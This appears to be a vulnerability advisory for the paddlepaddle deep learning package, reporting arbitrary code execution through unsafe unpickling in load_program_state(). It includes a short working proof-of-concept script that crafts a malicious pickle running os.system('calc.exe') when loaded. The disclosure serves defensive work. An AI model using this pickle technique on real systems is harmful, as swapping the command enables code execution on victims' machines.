# Description

`paddlepaddle` is an industrial platform with advanced technologies and rich features that cover core deep learning frameworks, basic model libraries, end-to-end development kits, tools & components as well as service platforms. This package is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

`paddle.fluid.load_program_state()` function is used to load program state from local file. It should only unpickle files that are saved with `paddle.fluid.save()` function.

# Proof of Concept

# Installation
```bash
pip install paddlepaddle
```

# Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
import paddle

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('payload.pdparams', 'wb') as file:
    file.write(payload)

paddle.fluid.load_program_state('payload')
```
